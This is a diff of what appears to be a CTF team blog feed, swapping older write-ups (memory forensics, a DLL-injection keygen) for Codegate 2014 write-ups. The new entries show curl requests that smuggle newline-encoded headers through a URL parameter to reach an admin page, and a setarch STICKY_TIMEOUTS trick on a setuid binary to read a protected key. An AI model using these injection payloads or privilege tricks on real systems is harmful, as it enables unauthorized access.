+
+<pre><code>&lt;!-- admin/index.php --&gt;
 </code></pre>
 
-<p>We noticed that there is a process called <code>asis-ctf</code>, which seems to provide the flag. Then we dump the executable file from memory of the process.</p>
+<p>So it’s clear that we will use that GET param “url” to access /admin/index.php</p>
 
-<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_proc_maps -p 9425
-Volatile Systems Volatility Framework 2.3_beta
-Pid      Start              End            Flags               Pgoff Major  Minor  Inode      File Path                    
-9425 0x0000000000400000 0x0000000000401000 r-x                   0x0    252      0     393333 /home/netadmin/asis-ctf      
-9425 0x0000000000600000 0x0000000000601000 r--                   0x0    252      0     393333 /home/netadmin/asis-ctf      
-9425 0x0000000000601000 0x0000000000602000 rw-                0x1000    252      0     393333 /home/netadmin/asis-ctf
-...
-$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_dump_map -p 9425 -D output
-$ hexdump -C -n 10 task.9425.0x600000.vma
-00000000  7f 45 4c 46 02 01 01 00  00 00                    |.ELF......|
-$ cat task.9425.0x600000.vma task.9425.0x601000.vma &gt; asis-ctf
-$ file asis-ctf
-asis-ctf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+<p>use “localhost” instead of “58.229.183.25”, and find out that a %0a(\n) will make the body information appears in header field, so there maybe some “http response splitting” trick</p>
+
+<p>after several test, we use two step to got the key.</p>
+
+<p>first step:</p>
+
+<pre><code>DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20localhost%0aRange:%20bytes=370-%0a%0a
+ &lt;html&gt;
+ &lt;head&gt;
+      &lt;style type="text/css"&gt;
+      body { margin:0; }
+      * { font-family:fantasy; }
+      p { height:50pt; font-size:50pt; background:green;  }
+      input[type=text] { width:500; font-size:15pt; }
+      input[type=submit] { width:150; font-size:15pt; }
+      input[type=submit]:hover { background:lightblue; }
+      table { font-size:15pt; border:0;}
+      .err { background:yellow; font-weight:bold; }
+      #l:hover{ color:white; font-weight:bold; }
+      &lt;/style&gt;
+      &lt;title&gt;Web proxy&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body bgcolor=gray&gt;&lt;br&gt;
+ &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
+ &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
+ Host: localhost
+ Range: bytes=370-
+
+ '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
+ Date: Sat, 22 Feb 2014 16:11:08 GMT
+ Server: Apache/2.4.6 (Ubuntu)
+ X-Powered-By: PHP/5.5.3-1ubuntu2.1
+ Vary: Accept-Encoding
+ Content-Range: bytes 370-429/430
+ Content-Length: 60
+ Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;
+
+ 0
+ &lt;!--if($_SERVER[HTTP_HOST]=="hackme")--&gt;&lt;/body&gt;
+ .
+ .
+ .
+ .
+ .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
+ &lt;!-- admin/index.php --&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
 </code></pre>
 
-<p>Here we get the ELF file, after doing some RE, we got the flag by runing the script below:</p>
+<p>second step:</p>
 
-<pre><code>table_s = """42 49 55 52 4c 41 57 4e 64 5f 69 37 69 31 3e 63
-6b 65 6c 33 3b 34 3d 65 3f 65 6f 63 47 31 75 36
-72 66 42 62 4a 65 75 39 49 66 48 34 4d 32 4a 34
-4e 37 4e 32 4d 35 55 65 50 37 82 32 84 61 52 35
-83 39 85 61 53 34 89 39 8b 64 26"""
-table = []
-for c in table_s.replace("\n", " ").split(" "):
-    n = int("0x" + c, 16)
-    table.append(n)
+<pre><code>     DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20hackme%0aRange:%20bytes=80-%0a%0a
+ &lt;html&gt;
+ &lt;head&gt;
+      &lt;style type="text/css"&gt;
+      body { margin:0; }
+      * { font-family:fantasy; }
+      p { height:50pt; font-size:50pt; background:green;  }
+      input[type=text] { width:500; font-size:15pt; }
+      input[type=submit] { width:150; font-size:15pt; }
+      input[type=submit]:hover { background:lightblue; }
+      table { font-size:15pt; border:0;}
+      .err { background:yellow; font-weight:bold; }
+      #l:hover{ color:white; font-weight:bold; }
+      &lt;/style&gt;
+      &lt;title&gt;Web proxy&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body bgcolor=gray&gt;&lt;br&gt;
+ &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
+ &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
+ Host: hackme
+ Range: bytes=80-
 
-flag = ""
-for i in range(0x25):
-    a = 2 * i
-    c = table[a] - i - 1
-    flag += chr(c)
-print flag
+ '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
+ Date: Sat, 22 Feb 2014 15:51:11 GMT
+ Server: Apache/2.4.6 (Ubuntu)
+ X-Powered-By: PHP/5.5.3-1ubuntu2.1
+ Vary: Accept-Encoding
+ Content-Range: bytes 80-126/127
+ Content-Length: 47
+ Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;
 
-$ python asis-ctf.py
-ASIS_cb6bb012a8ea07a426254293de2bc0ef
+ word is WH0_IS_SnUS_bI1G_F4N
+ &lt;/body&gt;
+ .
+ .
+ .
+ .4
+ .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
+ &lt;!-- admin/index.php --&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
 </code></pre>
 
-<p>The ELF file asis-ctf I got from the mem.dump is still not able to run, that’s why RE is still needed. Does anyone have an idea to extract an runnable asis-ctf from the memory? Please tell me;-)</p>
+<p>Password is WH0_IS_SnUS_bI1G_F4N</p>
 
+<p>Cheers :)          </p>
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup]]></title>
-    <link href="http://www.blue-lotus.net//ufo-ctf-2013-reverse-keygenme-writeup/"/>
-    <updated>2013-08-08T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//ufo-ctf-2013-reverse-keygenme-writeup</id>
-    <content type="html"><![CDATA[<p>I would come back with more details of this challenge.</p>
+    <title type="html"><![CDATA[Codegate CTF Quals 2014 Clone Technique writeup]]></title>
+    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/"/>
+    <updated>2014-02-25T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-clone_technique-writeup</id>
+    <content type="html"><![CDATA[<p>Clone_Techique is a 250 points reverseme. The given program is a win32 PE. </p>
 
-<p>Here is the approach that I used to generate a keygen: make a DLL and inject it into the target process. The source code of my library is as follows.</p>
+<p>After load it in IDA pro, we can see the main function contains a loop which calls <code>CreateProcessW</code> many many times, that explains the title “clone technique”. Before <code>CreateProcessW</code>, command string is prepared by <code>wsnprintf</code>, in which add some arguements when create new process. Except that, nothing special in main function.</p>
 
-<pre><code>#include "stdafx.h"
-#include &lt;iostream&gt;
-
-typedef unsigned char byte;
-
-extern HMODULE m_hModule;
-HANDLE m_hConsole;
-
-#pragma pack(1)
-struct CPU_
+<pre><code>if ( (unsigned int)count &lt;= 0xD0000000 )
 {
-    byte al_;
-    unsigned int k_init[4];
-    unsigned int data[4];
-    byte ip_;
-    byte sp_;
-    byte stack[8];
-};
-#pragma pack()
-
-unsigned int step_func[256] = {0x4011D0, 
-    0x401310, 
-    0x401490, 
-    0x401660, 
-    0x4017F0, 
-    0x401940, 
-    0x401AC0, 
-    0x401C90, 
-    0x401DF0, 
-    0x401FA0, 
-    0x402130, 
-    0x4022E0, 
-    0x402460, 
-    0x402660, 
-    0x4027D0, 
-    0x402960, 
-    0x402B50, 
-    0x402CB0, 
-    0x402E40, 
-    0x403010, 
-    0x4031C0, 
-    0x403330, 
-    0x4034D0, 
-    0x4036A0, 
-    0x403840, 
-    0x4039A0, 
-    0x403B00, 
-    0x403C50, 
-    0x403DE0, 
-    0x403F30, 
-    0x4040A0, 
-    0x404260, 
-    0x404430, 
-    0x4045F0, 
-    0x404760, 
-    0x404900, 
-    0x404A70, 
-    0x404C30, 
-    0x404DA0, 
-    0x404F40, 
-    0x4050C0, 
-    0x4051E0, 
-    0x405380, 
-    0x4054D0, 
-    0x4056A0, 
-    0x405850, 
-    0x4059D0, 
-    0x405B50, 
-    0x405D10, 
-    0x405E90, 
-    0x406030, 
-    0x406140, 
-    0x4062D0, 
-    0x4064A0, 
-    0x406610, 
-    0x4067A0, 
-    0x406940, 
-    0x406A80, 
-    0x406C20, 
-    0x406DF0, 
-    0x406F90, 
-    0x407110, 
-    0x4072A0, 
-    0x407420, 
-    0x4075A0, 
-    0x407740, 
-    0x407880, 
-    0x407A50, 
-    0x407C00, 
-    0x407DB0, 
-    0x407F80, 
-    0x408120, 
-    0x408290, 
-    0x408410, 
-    0x408570, 
-    0x4086D0, 
-    0x408890, 
-    0x4089D0, 
-    0x408B70, 
-    0x408D20, 
-    0x408EA0, 
-    0x408FE0, 
-    0x409170, 
-    0x4092B0, 
-    0x409490, 
-    0x409640, 
-    0x4097D0, 
-    0x4099A0, 
-    0x409B70, 
-    0x409CC0, 
-    0x409E90, 
-    0x409FE0, 
-    0x40A150, 
-    0x40A290, 
-    0x40A410, 
-    0x40A5D0, 
-    0x40A770, 
-    0x40A8D0, 
-    0x40AA30, 
-    0x40ABA0, 
-    0x40AD20, 
-    0x40AEB0, 
-    0x40B050, 
-    0x40B1B0, 
-    0x40B3B0, 
-    0x40B530, 
-    0x40B6D0, 
-    0x40B860, 
-    0x40BA40, 
-    0x40BBD0, 
-    0x40BD50, 
-    0x40BEB0, 
-    0x40C060, 
-    0x40C1A0, 
-    0x40C370, 
-    0x40C510, 
-    0x40C670, 
-    0x40C7F0, 
-    0x40C990, 
-    0x40CB00, 
-    0x40CCC0, 
-    0x40CE50, 
-    0x40CFF0, 
-    0x40D1C0, 
-    0x40D300, 
-    0x40D460, 
-    0x40D5D0, 
-    0x40D710, 
-    0x40D870, 
-    0x40DA00, 
-    0x40DBD0, 
-    0x40DD60, 
-    0x40DEE0, 
-    0x40E080, 
-    0x40E230, 
-    0x40E3C0, 
-    0x40E550, 
-    0x40E6F0, 
-    0x40E890, 
-    0x40EA10, 
-    0x40EB50, 
-    0x40ED50, 
-    0x40EE60, 
-    0x40EF80, 
-    0x40F0F0, 
-    0x40F2A0, 
-    0x40F400, 
-    0x40F560, 
-    0x40F710, 
-    0x40F890, 
-    0x40FA30, 
-    0x40FBC0, 
-    0x40FD50, 
-    0x40FE90, 
-    0x410020, 
-    0x410180, 
-    0x410340, 
-    0x4104B0, 
-    0x410620, 
-    0x410780, 
-    0x410930, 
-    0x410B20, 
-    0x410CB0, 
-    0x410E00, 
-    0x410F50, 
-    0x411130, 
-    0x411310, 
-    0x4114B0, 
-    0x4115F0, 
-    0x411730, 
-    0x4118E0, 
-    0x411A40, 
-    0x411BF0, 
-    0x411DA0, 
-    0x411F30, 
-    0x4120F0, 
-    0x412250, 
-    0x4123B0, 
-    0x412560, 
-    0x4126D0, 
-    0x412860, 
-    0x4129F0, 
-    0x412B90, 
-    0x412D30, 
-    0x412F10, 
-    0x413070, 
-    0x413200, 
-    0x4133A0, 
-    0x413510, 
-    0x413660, 
-    0x4137A0, 
-    0x4138D0, 
-    0x413A50, 
-    0x413BC0, 
-    0x413D30, 
-    0x413F00, 
-    0x4140C0, 
-    0x414220, 
-    0x4143A0, 
-    0x4144F0, 
-    0x414630, 
-    0x4147C0, 
-    0x414930, 
-    0x414AC0, 
-    0x414C70, 
-    0x414DD0, 
-    0x414F80, 
-    0x4150E0, 
-    0x4152A0, 
-    0x415430, 
-    0x4155E0, 
-    0x415750, 
-    0x4158C0, 
-    0x415A40, 
-    0x415BD0, 
-    0x415D30, 
-    0x415ED0, 
-    0x416060, 
-    0x416210, 
-    0x416360, 
-    0x416520, 
-    0x416690, 
-    0x416850, 
-    0x4169F0, 
-    0x416B20, 
-    0x416CE0, 
-    0x416E90, 
-    0x417010, 
-    0x417170, 
-    0x417300, 
-    0x417490, 
-    0x417690, 
-    0x417860, 
-    0x417A20, 
-    0x417B70, 
-    0x417D50, 
-    0x417EC0, 
-    0x417FD0, 
-    0x418140, 
-    0x418290, 
-    0x418420, 
-    0x418610, 
-    0x4187C0, 
-    0x418930, 
-    0x418AD0, 
-    0x418C50, 
-    0x418E30, 
-    0x418FD0, 
-    0x419140, 
-    0x419280, 
-    0x419410, 
-    0x4195B0, 
-    0x419710, 
-    0x4198B0, 
-    0x419A00, 
-    0x419B60};
-
-typedef void (__thiscall *__prepare_teamname)(struct CPU_* pCpu, char* szTeamName);
-typedef void (*__tean)(int uDecryptFlag, byte* pSrc, byte* pDst, unsigned int *k, unsigned int length);
-typedef void (__thiscall *__step)(struct CPU_* pCpu, unsigned int operation);
-
-__prepare_teamname prepare_teamname;
-__tean tean;
-__step step[256];
-
-VOID Initialize()
-{
-    prepare_teamname = (__prepare_teamname)0x419d00;
-    tean = (__tean)0x41ed50;
-
-    for(int i = 0; i &lt;= 0xff; ++i)
+    count = v1;
+    dword_409754 = v6;
+    GetModuleFileNameW(0, &amp;Filename, 0x12Cu);
+    do
     {
-        step[i] = (__step)step_func[i];
+        if ( (unsigned int)dword_409758 &gt; 0x190 )
+        return 0;
+        ++dword_409758;
+        wsprintfW(&amp;CommandLine, L"\"%s\" %u %u %u", &amp;Filename, v1, v6, dword_409758);
+        CreateProcessW(0, &amp;CommandLine, 0, 0, 0, 0, 0, 0, &amp;StartupInfo, &amp;ProcessInformation);
+        WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFFu);
+        GetExitCodeProcess(ProcessInformation.hProcess, &amp;ExitCode);
+        v1 = ExitCode;
+        v6 = sub_401280(ExitCode ^ v6, ExitCode % 0x1E);
     }
+    while ( ExitCode );
+    result = 0;
 }
+</code></pre>
 
-BOOL Search(byte* cmd, int ip, struct CPU_* cpu_, byte* dst_stack, byte* operation, int* final_ip, byte* init_stack)
+<p>It took me sometime to figure out where to store the flag. Finally I notice a strange string near the const string used by <code>wsprintfW</code>.</p>
+
+<pre><code>.data:00407030 magic_string    db 0Fh,'帪9=^?▃h',0Ch,'=嫮判{',9,'4叮g],0,0
+.data:00407030                                         ; DATA XREF: sub_401160+90o
+.data:0040704C ; const WCHAR aSUUU
+.data:0040704C aSUUU:                                  ; DATA XREF: real_main+128o
+.data:0040704C                 unicode 0, &lt;"%s" %u %u %u&gt;,0
+.data:00407068                 align 10h
+</code></pre>
+
+<p>Using Xref, IDA lead me to a interesting function. Noticing the <code>GetCommandLineW</code> call and <code>WriteProcessMemory</code> call, I believe it should be the key functin. </p>
+
+<p>But there is some anti-decompile technique disable IDA to decompile this function. </p>
+
+<pre><code>add     esp, 80h
+sub     esp, 80h
+</code></pre>
+
+<p>By filling the line shown above with nop. The IDA successfully decompile it.</p>
+
+<pre><code>v0 = GetCommandLineW();
+v5 = CommandLineToArgvW(v0, &amp;pNumArgs);
+if ( pNumArgs == 4 )
 {
-    if(ip &gt;= 16)
-    {
-        // Reach the end!
-        if(cpu_-&gt;ip_ &gt;= 32 &amp;&amp; cpu_-&gt;sp_ &gt;= 8)
-        {
-            *final_ip = cpu_-&gt;ip_;
-            return TRUE;
-        }
-        return FALSE;
-    }
-    else if(ip &gt;= 7)
-    {
-        // Do not pop anything onto our stack!
-        // We only try to manipulate the ip
-        for(int i = 1; i &lt;= 0xff; ++i)
-        {
-            struct CPU_ new_cpu;
-            memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));
+    Buffer = _wtoi(v5[1]);
+    v7 = _wtoi(v5[2]);
+    dword_409758 = _wtoi(v5[3]);
+}
+else
+{
+    Buffer = 0xA8276BFAu;
+    v7 = 0x92F837EDu;
+    dword_409758 = 1;
+}
+memset(sub_401070(&amp;magic_string, Buffer, v7), 0, 28u);
+Buffer ^= 0xB72AF098u;
+v7 ^= v7 * Buffer;
+lpBaseAddress = (char *)&amp;unk_409748 + 4;
+WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409748 + 4, &amp;Buffer, 4u, &amp;NumberOfBytesWritten);
+lpBaseAddress = (char *)&amp;unk_409750 + 4;
+return WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409750 + 4, &amp;v7, 4u, &amp;NumberOfBytesWritten);
+</code></pre>
 
-            int old_sp = new_cpu.sp_;
-            // Step
-            step[cmd[ip]](&amp;new_cpu, i);
-            if(old_sp != new_cpu.sp_)
-            {
-                // A new value has been written on stack
-                // return FALSE;
-            }
+<p>It is clear that the program compute the magic string with arguments. And then memset the new string with 0 immediately. The new string is very likely to be the flag. But we must know the correct arguements. Next step we need to find out the all the arguements when createprocess</p>
+
+<p>Using procmon, it is easy to monitor all newlly created process and log them. Export them all into XML file, and do some scripting, and then we get all the arguements when create process.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/procmon.png" alt="1" /></p>
+
+<p>Now it very close to the flag, but for me the pain just begins. Not familiar with debugging multi-process in windows, I decide to totally reverse the compute function. Luckily, with help of IDA it’s not that diffcult, but still took me some time. </p>
+
+<p>The most frustrating part is the ROL function provided by IDA don’t behave the same with the reverseme. Using a debugger, I set a breakpoint at the key function and compare the results of my own code and that of reverseme. </p>
+
+<p>With a rewritten key function, just enumerate all the parameters we dumped. Look over the 800+ results, we find:</p>
+
+<pre><code>And Now His Watch is Ended
+</code></pre>
+
+<p>That’s the flag!</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Codegate CTF Quals 2014 chrono writeup]]></title>
+    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup/"/>
+    <updated>2014-02-25T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-chrono-writeup</id>
+    <content type="html"><![CDATA[<p>Description</p>
+
+<pre><code>ssh guest@58.229.183.16 / ExtremelyDangerousGuest
+</code></pre>
+
+<p>Login, look around</p>
+
+<pre><code>guest@codegate:~$ ls -al
+total 20
+dr-xr-x--- 2 guest guest 4096 Feb 19 22:49 .
+drwxr-xr-x 4 root  root  4096 Feb 22 00:07 ..
+lrwxrwxrwx 1 root  root     9 Feb 19 22:22 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 root  root   220 Feb 19 22:21 .bash_logout
+-rw-r--r-- 1 guest guest 3637 Mar 31  2013 .bashrc
+-rw-r--r-- 1 guest guest  675 Mar 31  2013 .profile
+
+guest@codegate:~$ lsattr -a
+----i--------e-- ./.profile
+----i--------e-- ./.bash_logout
+-------------e-- ./..
+----i--------e-- ./.
+lsattr: Operation not supported While reading flags on ./.bash_history
+----i--------e-- ./.bashrc
+
+guest@codegate:/home/chrono$ ls -al
+total 924
+dr-xr-xr-x 2 chrono chrono   4096 Feb 19 22:24 .
+drwxr-xr-x 4 root   root     4096 Feb 22 00:07 ..
+lrwxrwxrwx 1 root   root        9 Feb 19 22:24 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 chrono chrono    220 Mar 31  2013 .bash_logout
+-rw-r--r-- 1 chrono chrono   3637 Mar 31  2013 .bashrc
+-rwsr-xr-x 1 chrono chrono 921576 Feb 19 22:13 chrono
+-r-------- 1 chrono chrono     28 Feb 22 00:07 key
+-rw-r--r-- 1 chrono chrono    675 Mar 31  2013 .profile
+
+guest@codegate:/home/chrono$ lsattr -a
+lsattr: Permission denied While reading flags on ./key
+----i--------e-- ./.profile
+----i--------e-- ./.bash_logout
+-------------e-- ./..
+----i--------e-- ./.
+lsattr: Operation not supported While reading flags on ./.bash_history
+----i--------e-- ./chrono
+----i--------e-- ./.bashrc
+</code></pre>
+
+<p>Nice security</p>
+
+<pre><code>guest@codegate:/home/chrono$ file chrono
+chrono: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x8c0628afc74aa0a346020da6d9bbd44bd90709a0, stripped
+</code></pre>
+
+<p>Stripped x86_64 binary</p>
+
+<p>To make it readable, feed the remote libc.a and libm.a to Flair, produce signature and apply in IDA</p>
+
+<p>Notice that the timeval struct provided by IDA has wrong size. Both tv_sec and tv_usec should be quad-word</p>
+
+<p>Read, read, read…</p>
+
+<p>The output depends on elapsed milliseconds during select. We have two options:</p>
+
+<ol>
+  <li>Solve the equation and controll the timing accurately</li>
+  <li>Keep timeout untouched, NaN save the world</li>
+</ol>
+
+<p>Read Linux source code <code>fs/select.c</code></p>
+
+<pre><code>SYSCALL_DEFINE5(select, int, n, fd_set __user *, inp, fd_set __user *, outp,
+                fd_set __user *, exp, struct timeval __user *, tvp)
+{
+    struct timespec end_time, *to = NULL;
+    struct timeval tv;
+    int ret;
+
+    if (tvp) {
+        if (copy_from_user(&amp;tv, tvp, sizeof(tv)))
+            return -EFAULT;
+
+        to = &amp;end_time;
+        if (poll_select_set_timeout(to,
+                tv.tv_sec + (tv.tv_usec / USEC_PER_SEC),
+                (tv.tv_usec % USEC_PER_SEC) * NSEC_PER_USEC))
+            return -EINVAL;
+    }
+
+    ret = core_sys_select(n, inp, outp, exp, to);
+    ret = poll_select_copy_remaining(&amp;end_time, tvp, 1, ret);
+
+    return ret;
+}
+</code></pre>
+
+<p>The timeval struct is updated in <code>poll_select_copy_remaining</code></p>
+
+<pre><code>static int poll_select_copy_remaining(struct timespec *end_time, void __user *p,
+                                      int timeval, int ret)
+{
+    struct timespec rts;
+    struct timeval rtv;
+
+    if (!p)
+        return ret;
+
+    if (current-&gt;personality &amp; STICKY_TIMEOUTS)
+        goto sticky;
+
+    ...
+    ...
+
+    /*
+     * If an application puts its timeval in read-only memory, we
+     * don't want the Linux-specific update to the timeval to
+     * cause a fault after the select has completed
+     * successfully. However, because we're not updating the
+     * timeval, we can't restart the system call.
+     */
+
+sticky:
+    if (ret == -ERESTARTNOHAND)
+        ret = -EINTR;
+    return ret;
+}
+</code></pre>
+
+<p>STICKY_TIMEOUTS sounds good. And one more important thing, STICKY_TIMEOUTS bit is not cleared for setuid exec. See Linux source code <code>include/uapi/linux/personality.h</code></p>
+
+<pre><code>/*
+ * Security-relevant compatibility flags that must be
+ * cleared upon setuid or setgid exec:
+ */
+#define PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC  | \
+                            ADDR_NO_RANDOMIZE  | \
+                            ADDR_COMPAT_LAYOUT | \
+                            MMAP_PAGE_ZERO)
+</code></pre>
+
+<p>So, how to change personality?</p>
+
+<pre><code>guest@codegate:/home/chrono$ setarch --help
+Usage: setarch &lt;arch&gt; [options] [program [program arguments]]
+
+Options:
+ -h, --help               displays this help text
+ -v, --verbose            says what options are being switched on
+ -R, --addr-no-randomize  disables randomization of the virtual address space
+ -F, --fdpic-funcptrs     makes function pointers point to descriptors
+ -Z, --mmap-page-zero     turns on MMAP_PAGE_ZERO
+ -L, --addr-compat-layout changes the way virtual memory is allocated
+ -X, --read-implies-exec  turns on READ_IMPLIES_EXEC
+ -B, --32bit              turns on ADDR_LIMIT_32BIT
+ -I, --short-inode        turns on SHORT_INODE
+ -S, --whole-seconds      turns on WHOLE_SECONDS
+ -T, --sticky-timeouts    turns on STICKY_TIMEOUTS
+ -3, --3gb                limits the used address space to a maximum of 3 GB
+     --4gb                ignored (for backward compatibility only)
+     --uname-2.6          turns on UNAME26
+
+For more information see setarch(8).
+</code></pre>
+
+<p>Give it a shot</p>
+
+<pre><code>guest@codegate:/home/chrono$ setarch x86_64 -T ./chrono
+cat key
+
+He said :
+    import zlib
+    zlib.compress(space)
+
+
+
+ o
+|+|
+ !
+[ ]
+
+
+
+
+voila!
+dIfF3rENT_L3VEL_s4me_aNsW3r
+</code></pre>
+
+<p>– EOF –</p>
+
+<pre><code>/*
+ * CodeGate 2014 - chrono 300 Point Logical
+ *
+ * Reverse Engineered by libmaru (libmaru#gmail.com)
+ *
+ * Build Environment:
+ *   Linux codegate 3.11.0-15-generic #25-Ubuntu SMP
+ *     Thu Jan 30 17:22:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+ *   gcc (Ubuntu/Linaro 4.8.1-10ubuntu9) 4.8.1
+ *
+ * Build Instruction:
+ *   gcc -static -fno-stack-protector -o chrono chrono.c -lm
+ *   strip chrono
+ *
+ * Produce identical binary except Build ID
+ *
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;math.h&gt;
+#include &lt;sys/select.h&gt;
+
+#define TIMEOUT     299792458
+#define PARAM       0.0030000000000000000625L
+#define IDEAL_SUM   6.6260690000000002087L
+#define PI          3.1415920000000001622L
+
+int main()
+{
+    long double remain = 0;
+    long double param = 0;
+    long double item = 0;
+    long double sum = 0;
+    struct timeval timeout;
+    fd_set readfds;
+    char buf[256] = {};
+    int x,y;
+    bool flag = 1;
+
+    timeout.tv_sec  = TIMEOUT / 1000000;
+    timeout.tv_usec = TIMEOUT % 1000000;
+
+    FD_ZERO( &amp;readfds );
+    FD_SET( 0, &amp;readfds );
+
+    if( select( 1, &amp;readfds, NULL, NULL, &amp;timeout ) &lt;= 0 )
+    {
+        puts( "no hack." );
+        exit( 0 );
+    }
+
+    remain = timeout.tv_sec * 1000000 + timeout.tv_usec;
+    puts( "\nHe said : \n\timport zlib\n\tzlib.compress(space)" );
+    param = ( TIMEOUT - remain ) * PARAM;
+
+    for( y = 10; y &gt;= 0; --y )
+    {
+        for( x = 0; x &lt;= 45; ++x )
+        {
+            item = sin( x/param + 4 ) + 5;
+            sum += item;
+
+            if( flag &amp;&amp; x &gt; 4 &amp;&amp; x == rint( param * PI ) &amp;&amp; rint( item ) == y-1 )
+                flag = 0, putchar('*');
+            else if( flag &amp;&amp; x == 45 &amp;&amp; y-1 == rint( item ) )
+                putchar('*');
+            else if( x &gt; 4 &amp;&amp; x &lt;= 45 &amp;&amp; rint( item ) == y )
+                putchar('#');
+            else if( x == 1 &amp;&amp; y == 7 )
+                putchar('o');
+            else if( x == 1 &amp;&amp; y == 6 )
+                putchar('+');
+            else if( x == 0 &amp;&amp; y == 6 )
+                putchar('|');
+            else if( x == 2 &amp;&amp; y == 6 )
+                putchar('|');
+            else if( x == 1 &amp;&amp; y == 5 )
+                putchar('!');
+            else if( x == 0 &amp;&amp; y == 4 )
+                putchar('[');
+            else if( x == 2 &amp;&amp; y == 4 )
+                putchar(']');
             else
-            {
-                if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
-                {
-                    operation[ip] = i;
-                    return TRUE;
-                }
-            }
+                putchar(' ');
         }
+        putchar('\n');
     }
-    else /* if(ip &gt;= 0 &amp;&amp; ip &lt; 7) */
+
+    if( FD_ISSET( 0, &amp;readfds ) )
     {
-        for(int init_stack_byte = 0; init_stack_byte &lt;= 0xff; ++init_stack_byte)
+        fgets( buf, sizeof buf - 1, stdin );
+        if( !( sum &gt; IDEAL_SUM ) &amp;&amp; !( sum &lt; IDEAL_SUM ) )
         {
-            cpu_-&gt;stack[cpu_-&gt;sp_ - 1] = (byte)init_stack_byte;
-
-            for(int i = 1; i &lt;= 0xff; ++i)
-            {
-                struct CPU_ new_cpu;
-                memcpy(&amp;new_cpu, cpu_, sizeof(struct CPU_));
-
-                int old_sp = new_cpu.sp_;
-                // Step
-                step[cmd[ip]](&amp;new_cpu, i);
-                if(old_sp != new_cpu.sp_)
-                {
-                    // A new value has been written on stack
-                    if(new_cpu.stack[new_cpu.sp_ - 2] == dst_stack[new_cpu.sp_ - 2])
-                    {
-                        // Search the next step
-                        char buf[40];
